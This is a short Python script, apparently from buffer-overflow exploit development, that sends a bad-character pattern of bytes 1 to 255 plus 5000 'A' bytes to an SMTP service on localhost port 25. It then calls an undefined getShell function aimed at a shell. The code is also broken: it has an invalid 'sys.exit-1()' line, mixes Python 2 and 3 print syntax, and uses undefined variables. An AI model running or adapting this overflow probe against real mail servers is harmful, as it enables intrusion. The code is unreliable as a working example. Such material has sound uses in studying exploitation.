#!/usr/bin/env python

import socket
import sys
from struct import pack

def sendPayload(host, port, payload):
	try:
		# Sending connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		s.send('')
		data = s.recv(4096)
		print(data)
		s.send('{0}\r\n'.format(payload))
		s.close()
	except:
		print "final length: {length}".format(length = len(payload))
		sys.exit-1()

def main():
	host = '127.0.0.1'
	port = 25

	# generate bad character pattern, skipping null byte
	byteValues = []

	for i in range(1, 256, 1):
		byteValues.append(i)

	badCharTest = bytearray(byteValues)

	payload = badCharTest + 'A' * 5000

	print('Total payload length: {0}'.format(len(payload)))

	sendPayload(host, port, payload)
	getShell(lhost, lport)

if __name__ == "__main__":
	sys.exit(main())
